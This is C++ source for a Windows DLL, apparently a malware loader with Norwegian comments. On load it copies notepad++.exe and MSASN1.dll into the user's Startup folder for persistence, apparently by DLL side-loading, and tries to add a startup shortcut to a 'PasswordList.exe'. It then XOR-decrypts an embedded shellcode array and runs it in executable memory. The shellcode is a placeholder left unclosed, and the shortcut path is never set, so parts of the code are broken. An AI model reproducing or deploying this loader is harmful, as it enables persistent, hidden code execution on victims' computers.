#include <windows.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <strsafe.h>
#include <stdio.h>

#pragma comment(lib, "Ole32.lib")

void CopyFromDownloadsNotepad(const wchar_t* filename) {
    wchar_t src[MAX_PATH], dst[MAX_PATH];

    if (!SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, src))) return;
    wcscat_s(src, MAX_PATH, L"\\Downloads\\PersonalInformation\\");
    wcscat_s(src, MAX_PATH, filename);

    if (!SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, dst))) return;
    wcscat_s(dst, MAX_PATH, L"\\");
    wcscat_s(dst, MAX_PATH, filename);

    if (!CopyFileW(src, dst, FALSE)) {
        wprintf(L"[!] Feil ved kopiering av %s (feilkode: %lu)\n", filename, GetLastError());
    }
    else {
        wprintf(L"[+] Kopierte %s til Startup\n", filename);
    }
}

void CreateShortcutInStartup() {
    wchar_t startupPath[MAX_PATH];
    wchar_t exePath[MAX_PATH];
    wchar_t shortcutPath[MAX_PATH];

    if (!SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) return;


    StringCchPrintfW(exePath, MAX_PATH, L"%s\\PasswordList.exe", startupPath);

    CoInitialize(NULL);

    IShellLinkW* pShellLink;
    HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&pShellLink);

    if (SUCCEEDED(hr)) {
        pShellLink->SetPath(exePath);
        pShellLink->SetDescription(L"Start PasswordList");
        pShellLink->SetWorkingDirectory(startupPath);

        IPersistFile* pPersistFile;
        hr = pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pPersistFile);

        if (SUCCEEDED(hr)) {
            pPersistFile->Save(shortcutPath, TRUE);
            pPersistFile->Release();
        }
        pShellLink->Release();
    }

    CoUninitialize();
}


void DeployToStartup() {
    CopyFromDownloadsNotepad(L"notepad++.exe");
    CopyFromDownloadsNotepad(L"MSASN1.dll");
    CreateShortcutInStartup();
}




// XOR shellcode
unsigned char encrypted[] = {//SHELLCODE}
  

// XOR-dekrypteringsfunksjon
void Decrypt(unsigned char* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; ++i) {
        data[i] ^= key;
    }
}

// Allokér, dekrypter og kjør shellcode i minnet
void RunShellcode() {
    size_t len = sizeof(encrypted);
    void* exec = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec) {
        memcpy(exec, encrypted, len);
        Decrypt((unsigned char*)exec, len, 0xAA);  // XOR-nøkkel
        ((void(*)())exec)(); // Kjør dekryptert shellcode
    }
}



// DLL entry point
BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DeployToStartup();  // <- gjør alt
		RunShellcode(); // Kjør shellcode
    }
    return TRUE;
}
